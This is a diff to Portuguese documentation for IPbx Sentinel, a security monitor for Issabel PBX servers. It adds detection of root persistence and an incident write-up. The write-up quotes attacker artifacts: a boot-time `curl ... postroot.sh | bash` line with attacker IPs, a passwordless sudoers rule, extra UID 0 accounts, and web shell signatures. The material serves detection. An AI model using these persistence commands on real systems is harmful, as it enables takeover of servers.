@@ -13,6 +13,7 @@ O **IPbx Sentinel** (`scripts/ipbx-sentinel.sh`) é o monitor único de seguran�
 | 1 min | **Firewall** (`iptables`/`firewalld` parado, ou ativo mas praticamente sem regras, o que deixa o servidor aberto) | Avisa uma vez e avisa quando voltar. Só avisa por padrão, pois o firewall é gerido pela tela do Issabel; para tentar reiniciar o serviço: `SENTINEL_FIREWALL_HEAL=1` |
 | 1 min | **Dialplan malicioso** (`thanku-outcall`, `custom-get-extensions`) | Só alerta |
 | 1 min | **Crontab suspeito** (`asterisk` e `root`) | Só alerta |
+| 1 min | **Persistência de invasor com poderes de root**: conta com UID 0 além do `root`, `rc.local` que baixa e executa script remoto no boot (`curl ... \| bash`, `postroot.sh`) e `sudo` sem senha para qualquer comando | Só alerta, uma vez por achado |
 | 1 min | **Versão vulnerável do painel** (aviso oficial Issabel de 02/08/2026: `issabel-framework` ≤ 4.0.0-12 no Issabel 4 ou ≤ 5.0.0-3 no Issabel 5 permite controle remoto) | Alerta uma vez por versão. A correção é automática na instalação (opção [20]/`install.sh`) ou com `ipbx-sentinel --update-framework` |
 | 5 min | **Web shells e invasões** em `/var/www/html` (assinaturas `Emad__Was__Here`, `eval` ofuscado em cadeia, `eval(base64_decode`, `c99shell`, `r57shell`...) | Quarentena reversível + alerta com data, arquivo e IP de origem |
 | 5 min | **Módulos falsos** (`phones`, `h`, `_cache`, `tinfo`, `fpbxphones`) e **PHP em pastas de imagem** | Quarentena + alerta |
@@ -101,3 +102,7 @@ Somente leitura (não altera nada). Cobre o que um invasor costuma deixar além 
 9. Asterisk: AMI aberto para qualquer origem e dialplan suspeito.
 
 Limites: o `last` e o `wtmp` só mostram logins SSH/console; uma invasão por falha web (RCE) não aparece ali. Logs rotacionados podem não retroceder até a data da invasão. Depois de um RCE com possível rootkit, reinstalar a partir de backup limpo continua sendo o caminho mais seguro.
+
+### Caso real: invasão com root (Issabel 4)
+
+A auditoria de um servidor invadido mostrou persistência de root: contas `yum` e `abort` com UID 0, linha `asterisk ALL=(ALL) NOPASSWD: ALL` no sudoers e, em `/etc/rc.local` e `/etc/rc.d/rc.local`, `curl http://<IP externo>/r/postroot.sh | bash` (IPs `212.83.160.70` e `104.194.143.156`), executado a cada boot. Nesse cenário o invasor já teve **root**: a limpeza manual não garante que o servidor esteja limpo, e o caminho mais seguro é reinstalar a partir de backup limpo, trocando todas as senhas e chaves. O Sentinel agora alerta esses três sinais em toda a frota (checagem a cada minuto).
